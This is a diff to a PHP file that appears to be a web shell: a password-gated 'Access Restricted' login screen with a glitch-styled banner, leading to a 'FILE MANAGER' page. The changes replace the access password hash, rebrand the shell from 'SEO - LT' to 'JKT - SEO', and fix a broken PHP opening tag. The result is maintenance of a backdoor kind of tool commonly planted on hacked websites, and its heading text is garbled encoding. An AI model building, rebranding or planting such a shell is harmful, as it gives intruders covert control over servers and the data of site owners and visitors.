@@ -2,7 +2,7 @@
 session_start();
 
 // Hash password (gunakan hash yang valid)
-$password = '$2a$12$PsaL3Z0XRYggTAWw9OSgsO4E2Q8zIOMpawAyPUPYb60Z1SvgzczLe';
+$password = '$2a$12$Odo6h4x85H3JpPqMwGJgTe8prPsLPsv9p.ycz8TvHkmTTSu2HBTSK';
 
 function login_shell()
 {
@@ -144,7 +144,7 @@ function login_shell()
     <canvas id="matrixCanvas"></canvas>
 
     <div class="login-container">
-        <h2 class="glitch">ÃƒÂ°Ã…Â¸Ã¢â‚¬Ã¢â‚¬â„¢ SEO - LT</h2>
+        <h2 class="glitch">ÃƒÂ°Ã…Â¸Ã¢â‚¬Ã¢â‚¬â„¢ JKT - SEO</h2>
         <span class="terminal-text">[ Access Restricted ]</span>
         <form action="" method="post">
             <input type="password" name="pass" placeholder="Enter Password" required>
@@ -224,7 +224,7 @@ if (!isset($_SESSION[$session_key])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SEO_File</title>
+    <title>JKT-SEO</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -305,7 +305,8 @@ if (!isset($_SESSION[$session_key])) {
 <body>
 <div id="container">
     <h1>FILE MANAGER</h1>
-    <?phpfunction clean_input($input) {
+    <?php
+    function clean_input($input) {
         return htmlspecialchars(strip_tags($input));
     }
 
